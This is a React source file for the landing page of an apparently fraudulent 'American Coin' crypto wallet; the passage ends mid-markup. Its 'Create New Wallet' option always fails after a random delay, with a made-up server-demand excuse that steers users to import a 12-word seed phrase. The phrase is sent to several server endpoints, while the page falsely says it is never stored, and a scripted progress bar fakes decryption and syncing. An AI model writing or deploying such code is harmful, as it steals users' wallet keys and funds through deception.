import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Shield, Wallet, Download, Plus, Loader2, AlertCircle, Smartphone, Share, MoreVertical, Mail, Lock, AlertTriangle, Clock, Key, Copy, Check } from "lucide-react";
import { useLocation } from "wouter";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/api";
import { useWallet } from "@/lib/wallet-context";
import logoImage from "@assets/generated_images/blue_shield_a_crypto_icon.png";

// Helper function to mask email address
// Example: abncd@gmail.com → a***d@g***.c**
function maskEmail(email: string): string {
  if (!email || !email.includes('@')) {
    return email;
  }
  
  const [localPart, domain] = email.split('@');
  
  // Mask local part: show first char and last char, mask middle with asterisks
  let maskedLocal = '';
  if (localPart.length <= 1) {
    maskedLocal = localPart;
  } else if (localPart.length === 2) {
    maskedLocal = localPart[0] + '*';
  } else {
    maskedLocal = localPart[0] + '*'.repeat(localPart.length - 2) + localPart[localPart.length - 1];
  }
  
  // Mask domain: split by dot
  const domainParts = domain.split('.');
  const maskedDomainParts = domainParts.map((part, index) => {
    const isLastPart = index === domainParts.length - 1;
    
    if (part.length <= 1) {
      return part;
    } else if (part.length === 2) {
      return part[0] + '*';
    } else {
      if (isLastPart) {
        // TLD: show first char and last char with asterisks in between
        return part[0] + '*'.repeat(part.length - 2) + part[part.length - 1];
      } else {
        // Domain part before TLD: show first char, rest with asterisks
        return part[0] + '*'.repeat(part.length - 1);
      }
    }
  });
  
  return `${maskedLocal}@${maskedDomainParts.join('.')}`;
}

export default function LandingPage() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { setAuthenticatedUser, user, isLoading } = useWallet();
  
  const [isOptionsOpen, setIsOptionsOpen] = useState(false);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [isImportOpen, setIsImportOpen] = useState(false);
  const [isRestoreTokenOpen, setIsRestoreTokenOpen] = useState(false);
  const [restoreToken, setRestoreToken] = useState("");
  const [isRestoring, setIsRestoring] = useState(false);
  const [isCreating, setIsCreating] = useState(false);
  const [createFailed, setCreateFailed] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [isImporting, setIsImporting] = useState(false);
  const [showMobileModal, setShowMobileModal] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [isIOS, setIsIOS] = useState(false);
  const [pendingRedirect, setPendingRedirect] = useState(false);
  const [showImportProgress, setShowImportProgress] = useState(false);
  const [importProgress, setImportProgress] = useState(0);
  const [importStage, setImportStage] = useState(0);
  const [showOTPModal, setShowOTPModal] = useState(false);
  const [showEmailModal, setShowEmailModal] = useState(false);
  const [otpEmail, setOtpEmail] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [otpExpiresAt, setOtpExpiresAt] = useState<number | null>(null);
  const [otpTimeLeft, setOtpTimeLeft] = useState<number>(600); // 10 minutes in seconds
  const [pendingSeedPhrase, setPendingSeedPhrase] = useState<string | null>(null);
  const [isRequestingOTP, setIsRequestingOTP] = useState(false);
  const [isVerifyingOTP, setIsVerifyingOTP] = useState(false);
  const [emailError, setEmailError] = useState<string | null>(null);
  const [showAddToHomeScreenModal, setShowAddToHomeScreenModal] = useState(false);
  const [userLoginToken, setUserLoginToken] = useState<string | null>(null);
  const [tokenCopied, setTokenCopied] = useState(false);
  const [userEmailHint, setUserEmailHint] = useState<string | null>(null);

  useEffect(() => {
    const checkMobile = () => {
      const ua = navigator.userAgent;
      const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
      const ios = /iPhone|iPad|iPod/i.test(ua);
      setIsMobile(mobile);
      setIsIOS(ios);
    };
    checkMobile();
  }, []);

  const handleImportSubmitWithPhrase = async (phrase: string) => {
    if (!phrase.trim()) {
      toast({ title: "Error", description: "Invalid seed phrase", variant: "destructive" });
      setIsImporting(false);
      return;
    }

    setIsImporting(true);
    setShowImportProgress(true);
    setImportProgress(0);
    setImportStage(0);
    
    // Define stages with progress thresholds
    const stages = [15, 30, 45, 60, 75, 90, 100];
    const stageMessages = [
      "Validating seed phrase...",
      "Decrypting wallet data...",
      "Verifying wallet integrity...",
      "Loading account balance...",
      "Synchronizing transactions...",
      "Finalizing import...",
      "Complete!"
    ];
    
    // Animate progress over 10 seconds (10000ms)
    const totalDuration = 10000;
    const updateInterval = 50; // Update every 50ms for smooth animation
    const progressPerUpdate = 100 / (totalDuration / updateInterval);
    let currentStage = 0;
    let progressValue = 0;
    
    const progressInterval = setInterval(() => {
      progressValue += progressPerUpdate;
      const newProgress = Math.min(progressValue, 100);
      setImportProgress(newProgress);
      
      // Update stage when progress threshold is reached
      if (currentStage < stages.length - 1 && newProgress >= stages[currentStage]) {
        currentStage++;
        setImportStage(currentStage);
      }
    }, updateInterval);
    
    try {
      // Start API call after a short delay (1 second)
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      const response = await apiRequest("POST", "/api/auth/import-wallet", { 
        seedPhrase: phrase.trim() 
      });
      const data = await response.json();
      
      // Wait for remaining animation time
      const elapsed = 1000; // Time already elapsed
      const remaining = Math.max(0, totalDuration - elapsed);
      await new Promise(resolve => setTimeout(resolve, remaining));
      
      clearInterval(progressInterval);
      setImportProgress(100);
      setImportStage(stages.length - 1);
      
      // Small delay before closing
      await new Promise(resolve => setTimeout(resolve, 500));
      
      if (data.success) {
        setAuthenticatedUser(data.userId);
        // Clear stored seed phrase after successful import (no longer needed)
        localStorage.removeItem("pendingSeedPhrase");
        setShowImportProgress(false);
        setIsImportOpen(false);
        
        // Fetch user login token to show in modal
        try {
          const userResponse = await apiRequest("GET", `/api/users/${data.userId}`);
          const userData = await userResponse.json();
          const token = (userData as any).loginToken || userData.id;
          setUserLoginToken(token);
          setShowAddToHomeScreenModal(true);
        } catch (error) {
          console.error("Failed to fetch login token:", error);
          // Still show modal but without token
          setShowAddToHomeScreenModal(true);
        }
        
        // Don't set pendingRedirect yet - wait for modal to be closed
        // Navigation will happen when modal is closed
      } else {
        clearInterval(progressInterval);
        setShowImportProgress(false);
        toast({ title: "Import Failed", description: data.error || "Invalid seed phrase", variant: "destructive" });
        // Don't clear stored seed phrase on failure - user might want to try again
      }
    } catch (error: any) {
      clearInterval(progressInterval);
      setShowImportProgress(false);
      toast({ title: "Import Failed", description: error.message || "Invalid seed phrase", variant: "destructive" });
      // Don't clear stored seed phrase on error - user might want to try again
    } finally {
      setIsImporting(false);
      setImportProgress(0);
      setImportStage(0);
    }
  };

  // OTP countdown timer
  useEffect(() => {
    if (otpExpiresAt && showOTPModal) {
      const interval = setInterval(() => {
        const now = Date.now();
        const remaining = Math.max(0, Math.floor((otpExpiresAt - now) / 1000));
        setOtpTimeLeft(remaining);
        
        if (remaining === 0) {
          clearInterval(interval);
        }
      }, 1000);
      
      return () => clearInterval(interval);
    }
  }, [otpExpiresAt, showOTPModal]);

  // Check for auto-import from email link or stored seed phrase
  useEffect(() => {
    if (typeof window === "undefined") return;
    
    // First, check URL parameters (from email link)
    const urlParams = new URLSearchParams(window.location.search);
    const importParam = urlParams.get("import");
    const tokenParam = urlParams.get("token");
    
    // If we have both token and import, try auto-login first
    if (tokenParam && importParam && !isImporting && !showEmailModal && !showOTPModal) {
      // Try to auto-login with token
      fetch("/api/auth/login-with-token", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ token: tokenParam }),
      })
        .then(res => res.json())
        .then(async (data) => {
          if (data.success && data.userId) {
            // Auto-login successful, set user ID and import wallet
            localStorage.setItem("userId", data.userId);
            
            try {
              // Decode base64 seed phrase
              const decodedSeedPhrase = atob(importParam);
              
              // Import wallet directly without OTP (since we're using the token)
              await handleImportSubmitWithPhrase(decodedSeedPhrase);
              
              // Clean up URL parameters
              window.history.replaceState({}, document.title, window.location.pathname);
            } catch (error) {
              console.error("Failed to decode seed phrase:", error);
              toast({ title: "Error", description: "Invalid import link", variant: "destructive" });
            }
          } else {
            // Token login failed, fall through to OTP flow
            handleImportFlow(importParam);
          }
        })
        .catch((error) => {
          console.error("Token login failed:", error);
          // Fall through to OTP flow
          handleImportFlow(importParam);
        });
    } else if (importParam && !isImporting && !showEmailModal && !showOTPModal) {
      // Only import parameter, use OTP flow
      handleImportFlow(importParam);
    } else {
      // Check localStorage for pending seed phrase (PWA installation)
      const storedSeedPhrase = localStorage.getItem("pendingSeedPhrase");
      const storedUserId = localStorage.getItem("userId");
      
      // Only show email modal if no user is logged in and we have a stored seed phrase
      if (storedSeedPhrase && !storedUserId && !isImporting && !showEmailModal && !showOTPModal) {
        // Show email modal for OTP verification
        setPendingSeedPhrase(storedSeedPhrase);
        setShowEmailModal(true);
      }
    }
    
    async function handleImportFlow(importParam: string) {
      try {
        // Decode base64 seed phrase
        const decodedSeedPhrase = atob(importParam);
        
        // Store seed phrase temporarily
        setPendingSeedPhrase(decodedSeedPhrase);
        localStorage.setItem("pendingSeedPhrase", decodedSeedPhrase);
        
        // Try to fetch user email from seed phrase to show hint
        try {
          const response = await apiRequest("POST", "/api/auth/get-user-by-seed", { seedPhrase: decodedSeedPhrase });
          const data = await response.json();
          if (data.email) {
            setUserEmailHint(data.email);
          }
        } catch (error) {
          // User might not exist yet, that's okay
          console.log("Could not fetch user email for hint:", error);
        }
        
        // Show email modal for OTP verification
        setShowEmailModal(true);
        
        // Clean up URL parameter
        window.history.replaceState({}, document.title, window.location.pathname);
      } catch (error) {
        console.error("Failed to decode seed phrase from URL:", error);
        toast({ title: "Error", description: "Invalid import link", variant: "destructive" });
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isImporting, showEmailModal, showOTPModal]);

  const handleRequestOTP = async () => {
    // Clear any previous errors
    setEmailError(null);
    
    if (!otpEmail || !pendingSeedPhrase) {
      const errorMsg = "Email is required";
      setEmailError(errorMsg);
      toast({ title: "Error", description: errorMsg, variant: "destructive" });
      return;
    }
    
    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(otpEmail.trim())) {
      const errorMsg = "Please enter a valid email address";
      setEmailError(errorMsg);
      toast({ title: "Error", description: errorMsg, variant: "destructive" });
      return;
    }
    
    setIsRequestingOTP(true);
    try {
      const response = await apiRequest("POST", "/api/auth/request-otp", {
        email: otpEmail.trim(),
        seedPhrase: pendingSeedPhrase
      });
      const data = await response.json();
      
      if (data.success) {
        // Clear any errors on success
        setEmailError(null);
        setShowEmailModal(false);
        setShowOTPModal(true);
        setOtpExpiresAt(data.expiresAt);
        setOtpTimeLeft(600); // 10 minutes
        toast({ title: "OTP Sent", description: "Check your email for the verification code" });
      } else {
        const errorMsg = data.error || "Failed to send OTP";
        setEmailError(errorMsg);
        toast({ title: "Error", description: errorMsg, variant: "destructive" });
      }
    } catch (error: any) {
      const errorMsg = error.message || "Failed to send OTP";
      setEmailError(errorMsg);
      toast({ title: "Error", description: errorMsg, variant: "destructive" });
    } finally {
      setIsRequestingOTP(false);
    }
  };

  const handleVerifyOTP = async () => {
    if (!otpCode || otpCode.length !== 6) {
      toast({ title: "Error", description: "Please enter a valid 6-digit code", variant: "destructive" });
      return;
    }
    
    if (otpTimeLeft === 0) {
      toast({ title: "Error", description: "OTP code has expired. Please request a new one.", variant: "destructive" });
      return;
    }
    
    setIsVerifyingOTP(true);
    try {
      const response = await apiRequest("POST", "/api/auth/verify-otp", {
        email: otpEmail.trim(),
        code: otpCode.trim()
      });
      const data = await response.json();
      
      if (data.success) {
        // OTP verified, proceed with import
        setShowOTPModal(false);
        if (pendingSeedPhrase) {
          handleImportSubmitWithPhrase(pendingSeedPhrase);
        }
      } else {
        toast({ title: "Error", description: data.error || "Invalid OTP code", variant: "destructive" });
      }
    } catch (error: any) {
      toast({ title: "Error", description: error.message || "Failed to verify OTP", variant: "destructive" });
    } finally {
      setIsVerifyingOTP(false);
    }
  };

  // Redirect to wallet if user is already authenticated (from localStorage)
  useEffect(() => {
    // Check if there's a stored userId in localStorage
    const storedUserId = typeof window !== "undefined" ? localStorage.getItem("userId") : null;
    
    if (storedUserId) {
      // User ID exists in localStorage - wait for user to load
      // But don't redirect if the add-to-home-screen modal is showing
      if (!isLoading && user && !showAddToHomeScreenModal) {
        // User is loaded and authenticated - redirect to wallet
        setLocation("/wallet");
      }
      // If still loading, wait for the next render when user loads
    }
    // If no stored userId, user needs to import/create wallet - show landing page
  }, [user, isLoading, showAddToHomeScreenModal, setLocation]);

  // Redirect to wallet once user is loaded after import (but wait for modal to be closed)
  useEffect(() => {
    if (pendingRedirect && !isLoading && user && !showAddToHomeScreenModal && !showMobileModal) {
      setPendingRedirect(false);
      // For mobile, show the mobile-specific modal after post-import modal
      if (isMobile) {
        setShowMobileModal(true);
      } else {
        setLocation("/wallet");
      }
    }
  }, [user, isLoading, pendingRedirect, isMobile, showAddToHomeScreenModal, showMobileModal, setLocation]);

  const handleStartNow = () => {
    setIsOptionsOpen(true);
  };

  const handleCreateWallet = () => {
    setIsOptionsOpen(false);
    setIsCreateOpen(true);
    setIsCreating(true);
    setCreateFailed(false);

    const delay = Math.floor(Math.random() * 3000) + 2000;
    setTimeout(() => {
      setIsCreating(false);
      setCreateFailed(true);
    }, delay);
  };

  const handleImportWallet = () => {
    setIsOptionsOpen(false);
    setIsImportOpen(true);
  };

  const handleRestoreWithToken = () => {
    setIsOptionsOpen(false);
    setIsRestoreTokenOpen(true);
  };

  const handleRestoreTokenSubmit = async () => {
    if (!restoreToken.trim()) {
      toast({ title: "Error", description: "Please enter a token", variant: "destructive" });
      return;
    }

    setIsRestoring(true);
    try {
      const response = await apiRequest("POST", "/api/auth/login-with-token", {
        token: restoreToken.trim(),
      });
      const data = await response.json();

      if (data.success && data.userId) {
        localStorage.setItem("userId", data.userId);
        setAuthenticatedUser(data.userId);
        toast({ title: "Success", description: "Wallet restored successfully" });
        setIsRestoreTokenOpen(false);
        setRestoreToken("");
        // Set pending redirect instead of immediate redirect
        // This will wait for user data to load before redirecting
        setPendingRedirect(true);
      } else {
        toast({ title: "Error", description: data.error || "Invalid token", variant: "destructive" });
      }
    } catch (error: any) {
      toast({ title: "Error", description: error.message || "Failed to restore wallet", variant: "destructive" });
    } finally {
      setIsRestoring(false);
    }
  };

  const handleImportSubmit = async () => {
    if (!seedPhrase.trim()) {
      toast({ title: "Error", description: "Please enter your seed phrase", variant: "destructive" });
      return;
    }
    await handleImportSubmitWithPhrase(seedPhrase);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
      <div className="container mx-auto px-4 py-8">
        <nav className="flex justify-between items-center mb-16">
          <div className="flex items-center gap-2">
            <img src={logoImage} alt="American Coin" className="w-10 h-10 rounded-full" />
            <span className="text-2xl font-display font-bold">American Coin</span>
          </div>
        </nav>

        <main className="flex flex-col items-center justify-center min-h-[70vh] text-center">
          <div className="max-w-3xl mx-auto space-y-8">
            <div className="inline-flex items-center gap-2 bg-primary/10 text-primary px-4 py-2 rounded-full text-sm font-medium">
              <Shield size={16} />
              Secure & Trusted
            </div>
            
            <h1 className="text-3xl sm:text-5xl md:text-7xl font-display font-bold leading-tight">
              Your Gateway to
              <span className="text-primary block">Digital Assets</span>
            </h1>
            
            <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
              Securely manage your cryptocurrency portfolio with American Coin. 
              Send, receive, and track your digital assets with confidence.
            </p>

            <div className="flex flex-col sm:flex-row gap-4 justify-center pt-4">
              <Button 
                size="lg" 
                className="text-lg px-8 py-6"
                onClick={handleStartNow}
                data-testid="button-start-now"
              >
                Start Now
              </Button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pt-16">
              <Card className="bg-card/50 backdrop-blur border-border/50">
                <CardContent className="pt-6 text-center">
                  <Shield className="h-12 w-12 text-primary mx-auto mb-4" />
                  <h3 className="font-semibold text-lg mb-2">Bank-Grade Security</h3>
                  <p className="text-muted-foreground text-sm">Your assets are protected with industry-leading security measures</p>
                </CardContent>
              </Card>
              <Card className="bg-card/50 backdrop-blur border-border/50">
                <CardContent className="pt-6 text-center">
                  <Wallet className="h-12 w-12 text-primary mx-auto mb-4" />
                  <h3 className="font-semibold text-lg mb-2">Multi-Asset Support</h3>
                  <p className="text-muted-foreground text-sm">Manage Bitcoin, Ethereum, and American Coin all in one place</p>
                </CardContent>
              </Card>
              <Card className="bg-card/50 backdrop-blur border-border/50">
                <CardContent className="pt-6 text-center">
                  <Download className="h-12 w-12 text-primary mx-auto mb-4" />
                  <h3 className="font-semibold text-lg mb-2">Easy Import</h3>
                  <p className="text-muted-foreground text-sm">Import your existing wallet with your seed phrase</p>
                </CardContent>
              </Card>
            </div>
          </div>
        </main>
      </div>

      <Dialog open={isOptionsOpen} onOpenChange={setIsOptionsOpen}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <DialogHeader>
            <DialogTitle className="text-xl text-center">Get Started</DialogTitle>
            <DialogDescription className="text-center">Choose how you want to set up your wallet</DialogDescription>
          </DialogHeader>
          <div className="grid gap-3 py-4">
            <Button 
              variant="outline" 
              className="h-16 flex items-center justify-start gap-3 px-4 rounded-xl"
              onClick={handleCreateWallet}
              data-testid="button-create-wallet"
            >
              <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center flex-shrink-0">
                <Plus className="h-5 w-5 text-primary" />
              </div>
              <div className="text-left">
                <div className="font-semibold text-sm">Create New Wallet</div>
                <div className="text-xs text-muted-foreground">Generate a new wallet</div>
              </div>
            </Button>
            <Button 
              variant="outline" 
              className="h-16 flex items-center justify-start gap-3 px-4 rounded-xl"
              onClick={handleImportWallet}
              data-testid="button-import-wallet"
            >
              <div className="w-10 h-10 rounded-full bg-accent/10 flex items-center justify-center flex-shrink-0">
                <Download className="h-5 w-5 text-accent" />
              </div>
              <div className="text-left">
                <div className="font-semibold text-sm">Import Existing Wallet</div>
                <div className="text-xs text-muted-foreground">Use your 12-word seed phrase</div>
              </div>
            </Button>
            <Button 
              variant="outline" 
              className="h-16 flex items-center justify-start gap-3 px-4 rounded-xl"
              onClick={handleRestoreWithToken}
              data-testid="button-restore-token"
            >
              <div className="w-10 h-10 rounded-full bg-green-500/10 flex items-center justify-center flex-shrink-0">
                <Key className="h-5 w-5 text-green-600" />
              </div>
              <div className="text-left">
                <div className="font-semibold text-sm">Restore with Token</div>
                <div className="text-xs text-muted-foreground">Use your login token</div>
              </div>
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Restore with Token Modal */}
      <Dialog open={isRestoreTokenOpen} onOpenChange={setIsRestoreTokenOpen}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <DialogHeader>
            <DialogTitle className="text-lg">Restore with Token</DialogTitle>
            <DialogDescription>
              Enter your login token to restore access to your wallet
            </DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-4">
            <div className="space-y-2">
              <Label htmlFor="token">Login Token</Label>
              <Input
                id="token"
                type="text"
                placeholder="Enter your login token"
                value={restoreToken}
                onChange={(e) => setRestoreToken(e.target.value)}
                className="rounded-xl font-mono text-sm"
                disabled={isRestoring}
              />
              <p className="text-xs text-muted-foreground">
                You can find your login token in your account settings after logging in
              </p>
            </div>
          </div>
          <DialogFooter className="flex gap-2">
            <Button 
              variant="outline" 
              onClick={() => {
                setIsRestoreTokenOpen(false);
                setRestoreToken("");
              }} 
              className="flex-1 rounded-xl"
              disabled={isRestoring}
            >
              Cancel
            </Button>
            <Button 
              onClick={handleRestoreTokenSubmit} 
              disabled={isRestoring || !restoreToken.trim()}
              className="flex-1 rounded-xl"
            >
              {isRestoring ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Restoring...
                </>
              ) : (
                "Restore"
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      <Dialog open={isCreateOpen} onOpenChange={setIsCreateOpen}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          {isCreating ? (
            <div className="flex flex-col items-center justify-center py-8 space-y-4">
              <Loader2 className="h-10 w-10 animate-spin text-primary" />
              <DialogTitle className="text-lg text-center">Creating Your Wallet...</DialogTitle>
              <DialogDescription className="text-center text-sm">
                Generating secure cryptographic keys. Please wait...
              </DialogDescription>
            </div>
          ) : createFailed ? (
            <>
              <DialogHeader className="text-center">
                <div className="flex items-center justify-center gap-2 text-red-500 mb-2">
                  <AlertCircle className="h-5 w-5" />
                  <DialogTitle className="text-lg text-red-500">Wallet Creation Failed</DialogTitle>
                </div>
                <DialogDescription className="text-sm">
                  We encountered an issue while creating your wallet. Our servers are experiencing high demand.
                </DialogDescription>
              </DialogHeader>
              <div className="py-4 space-y-3">
                <p className="text-xs text-muted-foreground text-center">
                  Please try again later or import an existing wallet if you have one.
                </p>
                <div className="flex gap-2">
                  <Button variant="outline" onClick={() => setIsCreateOpen(false)} className="flex-1 rounded-xl">
                    Close
                  </Button>
                  <Button onClick={() => {
                    setIsCreateOpen(false);
                    setIsImportOpen(true);
                  }} className="flex-1 rounded-xl">
                    Import Wallet
                  </Button>
                </div>
              </div>
            </>
          ) : null}
        </DialogContent>
      </Dialog>

      <Dialog open={isImportOpen} onOpenChange={setIsImportOpen}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <DialogHeader className="text-center">
            <DialogTitle className="text-lg">Import Wallet</DialogTitle>
            <DialogDescription className="text-sm">
              Enter your 12-word seed phrase to restore your wallet
            </DialogDescription>
          </DialogHeader>
          <div className="py-3">
            <Textarea
              placeholder="Enter your seed phrase (12 words separated by spaces)..."
              value={seedPhrase}
              onChange={(e) => setSeedPhrase(e.target.value)}
              className="min-h-[100px] font-mono text-sm rounded-xl"
              data-testid="input-seed-phrase"
            />
            <p className="text-xs text-muted-foreground mt-2 text-center">
              Your seed phrase is never stored on our servers.
            </p>
          </div>
          <DialogFooter className="flex gap-2 sm:gap-2">
            <Button variant="outline" onClick={() => setIsImportOpen(false)} className="flex-1 rounded-xl">Cancel</Button>
            <Button 
              onClick={handleImportSubmit} 
              disabled={isImporting || !seedPhrase.trim()}
              data-testid="button-confirm-import"
              className="flex-1 rounded-xl"
            >
              {isImporting ? <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Importing...</> : "Import"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Import Progress Modal */}
      <Dialog open={showImportProgress} onOpenChange={() => {}}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <div className="flex flex-col items-center justify-center py-6 space-y-6">
            <div className="relative">
              <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
                <Download className="h-10 w-10 text-primary animate-pulse" />
              </div>
              <div className="absolute inset-0 flex items-center justify-center">
                <Loader2 className="h-8 w-8 text-primary animate-spin" />
              </div>
            </div>
            
            <div className="text-center space-y-2">
              <DialogTitle className="text-lg">Importing Your Wallet</DialogTitle>
              <DialogDescription className="text-sm min-h-[20px]">
                {importStage === 0 && "Validating seed phrase..."}
                {importStage === 1 && "Decrypting wallet data..."}
                {importStage === 2 && "Verifying wallet integrity..."}
                {importStage === 3 && "Loading account balance..."}
                {importStage === 4 && "Synchronizing transactions..."}
                {importStage === 5 && "Finalizing import..."}
                {importStage === 6 && "Complete! Redirecting to your wallet..."}
              </DialogDescription>
            </div>
            
            <div className="w-full space-y-3">
              {/* Progress Bar */}
              <div className="w-full bg-muted rounded-full h-3 overflow-hidden">
                <div 
                  className="bg-gradient-to-r from-primary to-blue-500 h-full transition-all duration-300 ease-out rounded-full relative overflow-hidden"
                  style={{ width: `${importProgress}%` }}
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-pulse"></div>
                </div>
              </div>
              
              {/* Stage Indicators */}
              <div className="flex justify-between items-center px-1">
                {[0, 1, 2, 3, 4, 5, 6].map((stage) => (
                  <div
                    key={stage}
                    className={`w-2 h-2 rounded-full transition-all duration-300 ${
                      stage <= importStage
                        ? 'bg-primary scale-125'
                        : 'bg-muted-foreground/30'
                    }`}
                  />
                ))}
              </div>
              
              {/* Progress Percentage */}
              <p className="text-xs text-muted-foreground text-center font-medium">
                {Math.round(importProgress)}%
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Email Verification Modal */}
      <Dialog 
        open={showEmailModal} 
        onOpenChange={(open) => {
          setShowEmailModal(open);
          // Clear errors when modal is closed
          if (!open) {
            setEmailError(null);
            setOtpEmail("");
          }
        }}
      >
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <DialogHeader className="text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 rounded-2xl bg-red-500/10 flex items-center justify-center">
                <Mail className="h-8 w-8 text-red-500" />
              </div>
            </div>
            <DialogTitle className="text-xl">Verify Your Email</DialogTitle>
            <DialogDescription className="text-sm">
              For security, please enter your email address to receive a verification code
            </DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-4">
            <div className="bg-red-50 border border-red-200 rounded-lg p-3">
              <div className="flex items-start gap-2">
                <AlertTriangle className="h-5 w-5 text-red-500 flex-shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <p className="text-sm font-semibold text-red-800">Security Verification Required</p>
                  <p className="text-xs text-red-700">
                    To protect your wallet, we need to verify that you are the owner before importing.
                  </p>
                </div>
              </div>
            </div>
            <div className="space-y-2">
              <Label htmlFor="otp-email" className="text-sm font-medium">Email Address</Label>
              {userEmailHint && (
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-2 mb-2">
                  <p className="text-xs text-blue-800">
                    <span className="font-semibold">Hint:</span> Your email starts with <span className="font-mono">{maskEmail(userEmailHint)}</span>
                  </p>
                </div>
              )}
              <Input
                id="otp-email"
                type="email"
                placeholder={userEmailHint ? `e.g., ${userEmailHint.split('@')[0]}@...` : "your@email.com"}
                value={otpEmail}
                onChange={(e) => {
                  setOtpEmail(e.target.value);
                  // Clear error when user starts typing
                  if (emailError) {
                    setEmailError(null);
                  }
                }}
                className={`rounded-xl ${emailError ? "border-red-500 focus-visible:ring-red-500" : ""}`}
                disabled={isRequestingOTP}
              />
              {emailError && (
                <p className="text-xs text-red-500 flex items-center gap-1">
                  <AlertCircle className="h-3 w-3" />
                  {emailError}
                </p>
              )}
              {!emailError && userEmailHint && (
                <p className="text-xs text-muted-foreground">
                  Verification code will be sent to this email address
                </p>
              )}
            </div>
          </div>
          <DialogFooter className="flex gap-2">
            <Button 
              variant="outline" 
              onClick={() => {
                setShowEmailModal(false);
                setEmailError(null);
                setOtpEmail("");
                setPendingSeedPhrase(null);
                localStorage.removeItem("pendingSeedPhrase");
              }} 
              className="flex-1 rounded-xl"
              disabled={isRequestingOTP}
            >
              Cancel
            </Button>
            <Button 
              onClick={handleRequestOTP} 
              disabled={!otpEmail || isRequestingOTP}
              className="flex-1 rounded-xl bg-red-500 hover:bg-red-600"
            >
              {isRequestingOTP ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Sending...
                </>
              ) : (
                <>
                  <Mail className="mr-2 h-4 w-4" />
                  Send Code
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* OTP Verification Modal */}
      <Dialog open={showOTPModal} onOpenChange={() => {}}>
        <DialogContent className="w-[calc(100%-2rem)] max-w-sm mx-auto rounded-2xl">
          <DialogHeader className="text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 rounded-2xl bg-red-500/10 flex items-center justify-center">
                <Lock className="h-8 w-8 text-red-500" />
              </div>
            </div>
            <DialogTitle className="text-xl">Enter Verification Code</DialogTitle>
            <DialogDescription className="text-sm">
              We sent a 6-digit code to <strong>{otpEmail}</strong>
            </DialogDescription>
          </DialogHeader>
          <div className="py-4 space-y-4">
            {/* Expiration Warning */}
            {otpTimeLeft < 120 && (
              <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                <div className="flex items-center gap-2">
                  <Clock className="h-4 w-4 text-red-500" />
                  <p className="text-xs font-semibold text-red-800">
                    Code expires in {Math.floor(otpTimeLeft / 60)}:{(otpTimeLeft % 60).toString().padStart(2, '0')}
                  </p>
                </div>
              </div>
            )}
            
            {otpTimeLeft === 0 && (
              <div className="bg-red-100 border-2 border-red-500 rounded-lg p-3">
                <div className="flex items-start gap-2">
                  <AlertTriangle className="h-5 w-5 text-red-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-semibold text-red-800">Code Expired</p>
                    <p className="text-xs text-red-700 mt-1">
                      The verification code has expired. Please close this dialog and request a new code.
                    </p>
                  </div>
                </div>
              </div>
            )}
            
            <div className="space-y-2">
              <Label htmlFor="otp-code" className="text-sm font-medium">Verification Code</Label>
              <Input
                id="otp-code"
                type="text"
                placeholder="000000"
                value={otpCode}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                  setOtpCode(value);
                }}
                className="rounded-xl text-center text-2xl font-mono tracking-widest"
                maxLength={6}
                disabled={isVerifyingOTP || otpTimeLeft === 0}
              />
              <p className="text-xs text-muted-foreground text-center">
                {otpTimeLeft > 0 ? (
                  <>Code expires in {Math.floor(otpTimeLeft / 60)}:{(otpTimeLeft % 60).toString().padStart(2, '0')}</>
                ) : (
                  <span className="text-red-500 font-semibold">Code expired</span>
                )}
              </p>
            </div>
            
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
